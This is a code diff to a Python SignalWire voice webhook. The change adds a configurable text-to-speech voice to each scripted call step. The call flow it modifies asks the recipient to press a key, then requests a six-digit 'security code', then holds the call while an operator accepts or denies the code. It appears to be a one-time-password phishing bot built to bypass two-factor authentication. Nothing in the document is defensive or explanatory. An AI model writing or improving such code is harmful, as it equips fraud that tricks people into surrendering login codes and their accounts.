@@ -1144,22 +1144,23 @@ async def signalwire_voice_webhook(request: Request):
         current_step = call_log.get("current_step", "step1")
         steps = call_log.get("steps", {})
         config = call_log.get("config", {})
+        voice = config.get("voice_model", "Polly.Joanna-Neural")
         
         # Process based on current step
         if not digits:
             # No digits received yet - play the appropriate message
             if current_step == "step1":
                 await add_call_event(call_id, "CALL_ESTABLISHED", "Call answered by recipient")
-                await add_call_event(call_id, "STEP1_PLAYING", "Playing greeting - Press 1 or 0")
+                await add_call_event(call_id, "STEP1_PLAYING", f"Playing greeting - Press 1 or 0 (Voice: {voice})")
                 
                 message = format_tts_message(steps.get("step1", ""), config)
-                return create_laml_gather(message, num_digits=1, action=f"{WEBHOOK_BASE_URL}/api/signalwire-webhook/voice")
+                return create_laml_gather(message, num_digits=1, action=f"{WEBHOOK_BASE_URL}/api/signalwire-webhook/voice", voice=voice)
             
             elif current_step == "step2":
                 await add_call_event(call_id, "STEP2_PLAYING", f"Asking for {config.get('otp_digits', 6)}-digit security code")
                 
                 message = format_tts_message(steps.get("step2", ""), config)
-                return create_laml_gather(message, num_digits=config.get("otp_digits", 6), action=f"{WEBHOOK_BASE_URL}/api/signalwire-webhook/voice")
+                return create_laml_gather(message, num_digits=config.get("otp_digits", 6), action=f"{WEBHOOK_BASE_URL}/api/signalwire-webhook/voice", voice=voice)
             
             elif current_step == "step3":
                 await add_call_event(call_id, "STEP3_PLAYING", "Playing wait message")
@@ -1167,19 +1168,19 @@ async def signalwire_voice_webhook(request: Request):
                 
                 message = format_tts_message(steps.get("step3", ""), config)
                 # Hold the call - wait for verification
-                return create_laml_response(message, pause=60, loop=True)
+                return create_laml_response(message, pause=60, loop=True, voice=voice)
             
             elif current_step == "rejected":
                 await add_call_event(call_id, "STEP2_PLAYING", "Asking for code again (retry)")
                 
                 message = format_tts_message(steps.get("rejected", ""), config)
-                return create_laml_gather(message, num_digits=config.get("otp_digits", 6), action=f"{WEBHOOK_BASE_URL}/api/signalwire-webhook/voice")
+                return create_laml_gather(message, num_digits=config.get("otp_digits", 6), action=f"{WEBHOOK_BASE_URL}/api/signalwire-webhook/voice", voice=voice)
             
             elif current_step == "accepted":
                 await add_call_event(call_id, "ACCEPTED_PLAYING", "Playing accepted message")
                 
                 message = format_tts_message(steps.get("accepted", ""), config)
-                return create_laml_response(message, hangup=True)
+                return create_laml_response(message, hangup=True, voice=voice)
         
         else:
             # Digits received
@@ -1195,7 +1196,7 @@ async def signalwire_voice_webhook(request: Request):
                 await add_call_event(call_id, "STEP2_PLAYING", f"Asking for {config.get('otp_digits', 6)}-digit security code")
                 
                 message = format_tts_message(steps.get("step2", ""), config)
-                return create_laml_gather(message, num_digits=config.get("otp_digits", 6), action=f"{WEBHOOK_BASE_URL}/api/signalwire-webhook/voice")
+                return create_laml_gather(message, num_digits=config.get("otp_digits", 6), action=f"{WEBHOOK_BASE_URL}/api/signalwire-webhook/voice", voice=voice)
             
             elif current_step in ["step2", "rejected"]:
                 otp_digits = config.get("otp_digits", 6)
@@ -1218,9 +1219,9 @@ async def signalwire_voice_webhook(request: Request):
                 await add_call_event(call_id, "AWAITING_VERIFICATION", "Call on HOLD - Waiting for Accept or Deny...", show_verify=True)
                 
                 message = format_tts_message(steps.get("step3", ""), config)
-                return create_laml_response(message, pause=60, loop=True)
+                return create_laml_response(message, pause=60, loop=True, voice=voice)
         
-        return create_laml_response("Thank you. Goodbye.", hangup=True)
+        return create_laml_response("Thank you. Goodbye.", hangup=True, voice=voice)
         
     except Exception as e:
         logger.error(f"SignalWire voice webhook error: {e}")
